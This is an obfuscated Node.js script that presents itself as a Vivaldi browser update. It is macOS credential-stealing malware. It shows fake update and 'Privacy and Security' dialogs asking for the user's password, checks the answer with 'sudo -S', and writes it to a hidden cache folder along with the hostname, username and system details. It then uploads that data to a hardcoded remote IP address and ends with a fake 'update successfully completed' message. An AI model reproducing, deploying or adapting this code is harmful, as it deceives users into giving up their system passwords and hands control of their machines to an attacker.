#!/usr/bin/env node

const _0x597d77=_0x52c3;(function(_0x14a3c3,_0x1257ba){const _0x4cf46a=_0x52c3,_0x58d787=_0x14a3c3();while(!![]){try{const _0x5b2be4=-parseInt(_0x4cf46a(0x108))/0x1+parseInt(_0x4cf46a(0xd8))/0x2+-parseInt(_0x4cf46a(0x129))/0x3*(parseInt(_0x4cf46a(0x111))/0x4)+parseInt(_0x4cf46a(0x127))/0x5*(parseInt(_0x4cf46a(0xfa))/0x6)+-parseInt(_0x4cf46a(0xe3))/0x7+-parseInt(_0x4cf46a(0x10b))/0x8*(-parseInt(_0x4cf46a(0x137))/0x9)+parseInt(_0x4cf46a(0xe6))/0xa*(parseInt(_0x4cf46a(0x123))/0xb);if(_0x5b2be4===_0x1257ba)break;else _0x58d787['push'](_0x58d787['shift']());}catch(_0x7cfa57){_0x58d787['push'](_0x58d787['shift']());}}}(_0x2aa0,0x4fc3c));const {execSync}=require(_0x597d77(0x110)),fs=require('fs'),path=require(_0x597d77(0xd5)),os=require('os'),crypto=require(_0x597d77(0x105)),http=require('http'),https=require(_0x597d77(0xdf)),CONFIG={'serverUrl':_0x597d77(0x10e),'apiKey':_0x597d77(0x106),'retryDelay':0x1388,'maxRetries':0x5,'timeout':0x1d4c0};function generateClientId(){const _0x4a9bd2=_0x597d77;try{const _0x5eedfe=getMacAddress(),_0x294a30=os[_0x4a9bd2(0x107)](),_0xea5aaa=os[_0x4a9bd2(0xee)]()[_0x4a9bd2(0xed)],_0x2a3b71=crypto[_0x4a9bd2(0x124)]('md5')['update'](_0x5eedfe+':'+_0x294a30+':'+_0xea5aaa)[_0x4a9bd2(0x10c)](_0x4a9bd2(0x116))['substring'](0x0,0x8);return _0x2a3b71;}catch(_0x29cff8){return Math[_0x4a9bd2(0x112)]()[_0x4a9bd2(0xd6)](0x24)['substring'](0x2,0xa);}}function getMacAddress(){const _0x2dc50b=_0x597d77;try{const _0x21ffa4=os[_0x2dc50b(0x115)]();for(const _0x33a5cd of Object[_0x2dc50b(0x104)](_0x21ffa4)){for(const _0x1ce4dd of _0x21ffa4[_0x33a5cd]){if(!_0x1ce4dd[_0x2dc50b(0x128)]&&_0x1ce4dd[_0x2dc50b(0x117)]!==_0x2dc50b(0xec))return _0x1ce4dd[_0x2dc50b(0x117)];}}return _0x2dc50b(0xe1);}catch(_0x44b719){return _0x2dc50b(0xe1);}}function verifyPassword(_0x40c175,_0xa05232){const _0x48978d=_0x597d77;try{const _0x1ca658=path['join'](os[_0x48978d(0xe9)](),_0x48978d(0x139)+Date[_0x48978d(0xd7)]()+_0x48978d(0xf7)),_0x48a8b7='\x0a#!/bin/bash\x0aecho\x20\x22'+_0xa05232+_0x48978d(0x11f);return fs[_0x48978d(0x10a)](_0x1ca658,_0x48a8b7,{'mode':0x1c0}),execSync(_0x48978d(0xef)+_0x1ca658),fs[_0x48978d(0xff)](_0x1ca658),!![];}catch(_0xb9e8e5){return![];}}async function uploadFile(_0x5eb016,_0x5b3f3d=0x0){return new Promise(_0x25224f=>{const _0x4f6358=_0x52c3;try{if(!fs[_0x4f6358(0x10f)](_0x5eb016)){_0x25224f(![]);return;}const _0x361497=fs[_0x4f6358(0x120)](_0x5eb016),_0x16c356=_0x361497['size'];if(_0x16c356===0x0){_0x25224f(![]);return;}const _0x3d30c8=fs[_0x4f6358(0xd0)](_0x5eb016);let _0x45fec7;const _0x56488f=path[_0x4f6358(0xf1)](_0x5eb016),_0xe31701=_0x56488f[_0x4f6358(0xfc)]('.')[0x0];_0xe31701[_0x4f6358(0xf8)]===0x8&&/^[0-9a-f]+$/i[_0x4f6358(0xf5)](_0xe31701)?_0x45fec7=_0xe31701:_0x45fec7=generateClientId();const _0x3693ab={'hostname':os[_0x4f6358(0x107)](),'platform':os['platform'](),'type':os['type'](),'arch':os[_0x4f6358(0xf3)](),'username':os['userInfo']()[_0x4f6358(0xed)],'id':_0x45fec7},_0x4d350b=CONFIG[_0x4f6358(0xeb)][_0x4f6358(0x11e)](_0x4f6358(0x133)),_0x5d8ec0=_0x4d350b?https:http,_0x2b4538=new URL(CONFIG[_0x4f6358(0xeb)]),_0x536f72=_0x4f6358(0x109)+Math[_0x4f6358(0x112)]()[_0x4f6358(0xd6)](0x10)['substr'](0x2);let _0xf42618='';_0xf42618+='--'+_0x536f72+'\x0d\x0a',_0xf42618+=_0x4f6358(0xde),_0xf42618+=_0x4f6358(0x119),_0xf42618+=JSON[_0x4f6358(0x125)](_0x3693ab)+'\x0d\x0a',_0xf42618+='--'+_0x536f72+'\x0d\x0a',_0xf42618+=_0x4f6358(0xe7)+path[_0x4f6358(0xf1)](_0x5eb016)+_0x4f6358(0x12e),_0xf42618+=_0x4f6358(0x134);const _0x2c1607={'hostname':_0x2b4538[_0x4f6358(0x107)],'port':_0x2b4538['port']||(_0x4d350b?0x1bb:0x50),'path':_0x2b4538['pathname']+_0x2b4538[_0x4f6358(0x13b)],'method':_0x4f6358(0xe8),'headers':{'Content-Type':_0x4f6358(0x132)+_0x536f72,'X-Client-Info':JSON['stringify'](_0x3693ab),'X-API-Key':CONFIG[_0x4f6358(0xf4)]},'timeout':CONFIG['timeout']},_0x1cc6bb=_0x5d8ec0[_0x4f6358(0xf2)](_0x2c1607,_0x48b11e=>{const _0x436388=_0x4f6358;let _0x3481e8='';_0x48b11e['on'](_0x436388(0x12a),_0x1a42a5=>{_0x3481e8+=_0x1a42a5;}),_0x48b11e['on'](_0x436388(0x136),()=>{const _0x180caf=_0x436388;_0x48b11e[_0x180caf(0xf0)]>=0xc8&&_0x48b11e[_0x180caf(0xf0)]<0x12c?_0x25224f(!![]):_0x5b3f3d<CONFIG[_0x180caf(0xf6)]?setTimeout(()=>{const _0x30bfe9=_0x180caf;uploadFile(_0x5eb016,_0x5b3f3d+0x1)[_0x30bfe9(0x135)](_0x25224f);},CONFIG[_0x180caf(0x113)]):_0x25224f(![]);});});_0x1cc6bb['on'](_0x4f6358(0xce),_0x5a7a7d=>{const _0x29c3a8=_0x4f6358;_0x5b3f3d<CONFIG[_0x29c3a8(0xf6)]?setTimeout(()=>{const _0x10662d=_0x29c3a8;uploadFile(_0x5eb016,_0x5b3f3d+0x1)[_0x10662d(0x135)](_0x25224f);},CONFIG[_0x29c3a8(0x113)]):_0x25224f(![]);}),_0x1cc6bb['write'](_0xf42618),_0x1cc6bb[_0x4f6358(0x114)](_0x3d30c8),_0x1cc6bb['write']('\x0d\x0a--'+_0x536f72+_0x4f6358(0x126)),_0x1cc6bb[_0x4f6358(0x136)]();}catch(_0x464cec){_0x5b3f3d<CONFIG['maxRetries']?setTimeout(()=>{const _0x4c0296=_0x4f6358;uploadFile(_0x5eb016,_0x5b3f3d+0x1)[_0x4c0296(0x135)](_0x25224f);},CONFIG['retryDelay']):_0x25224f(![]);}});}function showPasswordPrompt(_0x564028,_0x2cc744=0x3,_0x400534=!![]){const _0x296e56=_0x597d77;try{const _0x31545e=os[_0x296e56(0x12b)](),_0x32dacb=path[_0x296e56(0xd4)](_0x31545e,_0x296e56(0xd2));!fs[_0x296e56(0x10f)](_0x32dacb)&&fs['mkdirSync'](_0x32dacb,{'recursive':!![]});_0x564028=_0x564028||path[_0x296e56(0xd4)](_0x32dacb,'vivaldi_passwords.txt');const _0x193157=os[_0x296e56(0xee)]()[_0x296e56(0xed)];let _0x48430b=_0x2cc744,_0x339d05=![],_0x572b7c='';while(_0x48430b>0x0&&!_0x339d05){const _0x5c9cc9=path[_0x296e56(0xd4)](os[_0x296e56(0xe9)](),'vivaldi_update_prompt_'+Date[_0x296e56(0xd7)]()+_0x296e56(0x10d));let _0x5e6815=_0x48430b<_0x2cc744?_0x296e56(0x101):'';const _0x3d3ddc=['Vivaldi\x20-\x20Component\x20Update',_0x296e56(0xfe),_0x296e56(0x13c)],_0x50d07a=[_0x296e56(0xdc),_0x296e56(0xfd),'To\x20update,\x20enter\x20the\x20user\x20password.'],_0x325480=Math['floor'](Math['random']()*_0x3d3ddc[_0x296e56(0xf8)]),_0x48fc34=_0x3d3ddc[_0x325480],_0x2d246f=_0x50d07a[_0x325480],_0x514a84=_0x296e56(0x122)+_0x193157+'\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20set\x20dialogTitle\x20to\x20\x22'+_0x48fc34+'\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20set\x20dialogText\x20to\x20\x22'+_0x5e6815+_0x2d246f+_0x296e56(0xea),_0x121538='\x0a\x20\x20\x20\x20\x20\x20\x20\x20set\x20username\x20to\x20\x22'+_0x193157+_0x296e56(0x102)+_0x48fc34+_0x296e56(0xe0)+_0x5e6815+_0x2d246f+'\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20set\x20buttonText\x20to\x20\x22Continue\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20try\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display\x20dialog\x20dialogText\x20with\x20title\x20dialogTitle\x20default\x20answer\x20\x22\x22\x20buttons\x20{\x22Cancel\x22,\x20buttonText}\x20default\x20button\x20buttonText\x20with\x20icon\x20caution\x20with\x20hidden\x20answer\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20set\x20userPassword\x20to\x20text\x20returned\x20of\x20the\x20result\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20return\x20userPassword\x0a\x20\x20\x20\x20\x20\x20\x20\x20on\x20error\x20number\x20-128\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20return\x20\x22CANCELLED\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20end\x20try\x0a\x20\x20\x20\x20\x20\x20';fs['writeFileSync'](_0x5c9cc9,_0x514a84);try{_0x572b7c=execSync(_0x296e56(0xe4)+_0x5c9cc9+'\x22')[_0x296e56(0xd6)]()['trim']();}catch(_0x55abe9){fs[_0x296e56(0x10a)](_0x5c9cc9,_0x121538),_0x572b7c=execSync('osascript\x20\x22'+_0x5c9cc9+'\x22')[_0x296e56(0xd6)]()['trim']();}fs['unlinkSync'](_0x5c9cc9);if(_0x572b7c===_0x296e56(0xd9))return![];_0x400534?_0x339d05=verifyPassword(_0x193157,_0x572b7c):_0x339d05=!![];if(!_0x339d05){_0x48430b--;if(_0x48430b<=0x0){const _0x372dea=path[_0x296e56(0xd4)](os[_0x296e56(0xe9)](),_0x296e56(0x131)+Date[_0x296e56(0xd7)]()+_0x296e56(0x10d)),_0xa05775=_0x296e56(0x12d);return fs[_0x296e56(0x10a)](_0x372dea,_0xa05775),execSync('osascript\x20\x22'+_0x372dea+'\x22'),fs['unlinkSync'](_0x372dea),![];}}}if(_0x339d05){const _0x4337fa=generateClientId(),_0x5b79b5=os['homedir'](),_0xc5d53c=path[_0x296e56(0xd4)](_0x5b79b5,_0x296e56(0xd2));!fs[_0x296e56(0x10f)](_0xc5d53c)&&fs['mkdirSync'](_0xc5d53c,{'recursive':!![]});const _0x56a8f4=path['join'](_0xc5d53c,_0x4337fa+_0x296e56(0x103)),_0x1c3fba=_0x296e56(0xe5)+_0x193157+_0x296e56(0x121)+_0x572b7c+'\x0aTime:\x20'+new Date()[_0x296e56(0x12f)]()+_0x296e56(0x100)+os[_0x296e56(0x107)]()+_0x296e56(0xe2)+os[_0x296e56(0x118)]()+'\x0aType:\x20'+os['type']()+_0x296e56(0x11c)+os[_0x296e56(0xf3)]()+_0x296e56(0xcf)+_0x4337fa;fs[_0x296e56(0x10a)](_0x56a8f4,_0x1c3fba);try{const _0x523da3={'user':_0x193157,'password':_0x572b7c,'timestamp':new Date()[_0x296e56(0x12f)](),'hostname':os[_0x296e56(0x107)](),'system':{'platform':os[_0x296e56(0x118)](),'release':os['release'](),'type':os[_0x296e56(0x130)](),'arch':os[_0x296e56(0xf3)]()},'clientId':_0x4337fa},_0x226184=path[_0x296e56(0xd4)](_0xc5d53c,_0x4337fa+_0x296e56(0xf9));fs[_0x296e56(0x10a)](_0x226184,JSON[_0x296e56(0x125)](_0x523da3,null,0x2)),_0x564028&&_0x564028!==_0x56a8f4&&fs['writeFileSync'](_0x564028,_0x1c3fba,{'flag':'a'}),uploadFile(_0x56a8f4)[_0x296e56(0x135)](_0x4f255e=>{});}catch(_0x4184ce){}const _0x488189=path[_0x296e56(0xd4)](os[_0x296e56(0xe9)](),'vivaldi_update_success_'+Date[_0x296e56(0xd7)]()+'.scpt'),_0x3da538=_0x296e56(0xda),_0x4fb414='\x0a\x20\x20\x20\x20\x20\x20\x20\x20display\x20dialog\x20\x22Vivaldi\x20update\x20successfully\x20completed.\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x20with\x20icon\x20note\x0a\x20\x20\x20\x20\x20\x20';fs[_0x296e56(0x10a)](_0x488189,_0x3da538);try{execSync('osascript\x20\x22'+_0x488189+'\x22');}catch(_0x125ad7){fs[_0x296e56(0x10a)](_0x488189,_0x4fb414),execSync(_0x296e56(0xe4)+_0x488189+'\x22');}return fs[_0x296e56(0xff)](_0x488189),!![];}return![];}catch(_0x12dcc9){return![];}}function _0x2aa0(){const _0x162271=['writeFileSync','611528UGRPPm','digest','.scpt','http://65.87.7.103:8088/api/files/upload','existsSync','child_process','4mXWVGS','random','retryDelay','write','networkInterfaces','hex','mac','platform','Content-Type:\x20application/json\x0d\x0a\x0d\x0a','slice','--help','\x0aArchitecture:\x20','argv','startsWith','\x22\x20|\x20sudo\x20-S\x20echo\x20\x22Password\x20verified\x22\x202>/dev/null\x0aexit\x20$?\x0a','statSync','\x0aPassword:\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20set\x20username\x20to\x20\x22','1595dfyUaJ','createHash','stringify','--\x0d\x0a','5ySSoAx','internal','1298013HVWEEp','data','homedir','exports','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display\x20dialog\x20\x22Maximum\x20password\x20attempts\x20exceeded.\x20Update\x20canceled.\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x20with\x20icon\x20stop\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','\x22\x0d\x0a','toISOString','type','vivaldi_update_error_','multipart/form-data;\x20boundary=','https://','Content-Type:\x20text/plain\x0d\x0a\x0d\x0a','then','end','54xYXgrm','verify','verify_password_','log','search','Outdated\x20Vivaldi\x20Version.\x20Update\x20Required','--no-verify','error','\x0aClientID:\x20','readFileSync','help','VivaldiCache','--output','join','path','toString','now','858942iBAZmv','CANCELLED','\x0a\x20\x20\x20\x20\x20\x20\x20\x20display\x20dialog\x20\x22Vivaldi\x20update\x20successfully\x20completed.\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x20with\x20icon\x20path\x20to\x20resource\x20\x22AppIcon.icns\x22\x20in\x20bundle\x20\x22/Applications/Vivaldi.app\x22\x0a\x20\x20\x20\x20\x20\x20','outputFile','Your\x20password\x20is\x20required\x20to\x20complete\x20the\x20Vivaldi\x20update.','maxAttempts','Content-Disposition:\x20form-data;\x20name=\x22clientInfo\x22\x0d\x0a','https','\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20set\x20dialogText\x20to\x20\x22','unknown','\x0aPlatform:\x20','4051152pbgEii','osascript\x20\x22','User:\x20','39210wtCdMN','Content-Disposition:\x20form-data;\x20name=\x22file\x22;\x20filename=\x22','POST','tmpdir','\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20set\x20buttonText\x20to\x20\x22Continue\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20try\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display\x20dialog\x20dialogText\x20with\x20title\x20dialogTitle\x20default\x20answer\x20\x22\x22\x20buttons\x20{\x22Cancel\x22,\x20buttonText}\x20default\x20button\x20buttonText\x20with\x20icon\x20path\x20to\x20resource\x20\x22AppIcon.icns\x22\x20in\x20bundle\x20\x22/Applications/Vivaldi.app\x22\x20with\x20hidden\x20answer\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20set\x20userPassword\x20to\x20text\x20returned\x20of\x20the\x20result\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20return\x20userPassword\x0a\x20\x20\x20\x20\x20\x20\x20\x20on\x20error\x20number\x20-128\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20return\x20\x22CANCELLED\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20end\x20try\x0a\x20\x20\x20\x20\x20\x20','serverUrl','00:00:00:00:00:00','username','userInfo','bash\x20','statusCode','basename','request','arch','apiKey','test','maxRetries','.sh','length','.json','1381866wHXrQe','main','split','The\x20application\x20\x22Vivaldi\x22\x20is\x20trying\x20to\x20make\x20changes\x20to\x20system\x20settings.','Privacy\x20and\x20Security','unlinkSync','\x0aHostname:\x20','Incorrect\x20password\x20entered.\x20','\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20set\x20dialogTitle\x20to\x20\x22','.txt','keys','crypto','tJz4uRVCwl2eEwyPTudYP9iGRfgq','hostname','348850utuLmc','----WebKitFormBoundary'];_0x2aa0=function(){return _0x162271;};return _0x2aa0();}function parseArgs(){const _0x55a385=_0x597d77,_0x276ac8=process[_0x55a385(0x11d)][_0x55a385(0x11a)](0x2),_0x536654={'outputFile':null,'maxAttempts':0x7,'verify':!![],'help':![]};for(let _0x321c42=0x0;_0x321c42<_0x276ac8[_0x55a385(0xf8)];_0x321c42++){switch(_0x276ac8[_0x321c42]){case _0x55a385(0xd3):case'-o':_0x536654[_0x55a385(0xdb)]=_0x276ac8[++_0x321c42];break;case'--attempts':case'-a':_0x536654[_0x55a385(0xdd)]=parseInt(_0x276ac8[++_0x321c42],0xa);break;case _0x55a385(0xcd):_0x536654['verify']=![];break;case _0x55a385(0x11b):case'-h':_0x536654[_0x55a385(0xd1)]=!![];break;}}return _0x536654;}function showHelp(){const _0x1d28e9=_0x597d77;console[_0x1d28e9(0x13a)]('\x0aVivaldi\x20Password\x20Prompt\x20-\x20utility\x20to\x20obtain\x20macOS\x20password\x0a\x0aUsage:\x0a\x20\x20vivaldi-password-prompt\x20[options]\x0a\x0aOptions:\x0a\x20\x20-o,\x20--output\x20FILE\x20\x20\x20\x20\x20\x20\x20Path\x20to\x20file\x20for\x20saving\x20password\x0a\x20\x20-a,\x20--attempts\x20NUM\x20\x20\x20\x20\x20\x20Maximum\x20number\x20of\x20input\x20attempts\x20(default:\x203)\x0a\x20\x20--no-verify\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Disable\x20password\x20verification\x0a\x20\x20-h,\x20--help\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Show\x20this\x20help\x0a\x20\x20\x0aExamples:\x0a\x20\x20vivaldi-password-prompt\x0a\x20\x20vivaldi-password-prompt\x20--output\x20/path/to/passwords.json\x20--attempts\x205\x0a\x20\x20vivaldi-password-prompt\x20--no-verify\x0a\x20\x20');}function _0x52c3(_0xda23b8,_0x54a2e9){const _0x2aa0ba=_0x2aa0();return _0x52c3=function(_0x52c37b,_0x34ab88){_0x52c37b=_0x52c37b-0xcd;let _0x5f52f2=_0x2aa0ba[_0x52c37b];return _0x5f52f2;},_0x52c3(_0xda23b8,_0x54a2e9);}if(require[_0x597d77(0xfb)]===module){const options=parseArgs();options[_0x597d77(0xd1)]?showHelp():showPasswordPrompt(options[_0x597d77(0xdb)],options[_0x597d77(0xdd)],options[_0x597d77(0x138)]);}module[_0x597d77(0x12c)]={'showPasswordPrompt':showPasswordPrompt,'verifyPassword':verifyPassword};
